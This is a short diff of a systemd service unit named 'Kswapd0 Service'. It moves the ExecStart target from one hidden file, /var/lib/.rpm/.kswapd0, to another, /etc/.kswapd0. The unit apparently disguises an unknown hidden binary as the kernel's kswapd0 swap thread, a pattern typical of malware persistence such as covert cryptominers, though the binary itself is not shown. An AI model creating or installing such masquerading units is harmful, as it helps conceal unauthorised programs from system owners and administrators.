@@ -2,7 +2,7 @@
 Description=Kswapd0 Service
 
 [Service]
-ExecStart=/var/lib/.rpm/.kswapd0
+ExecStart=/etc/.kswapd0
  
 
 [Install]
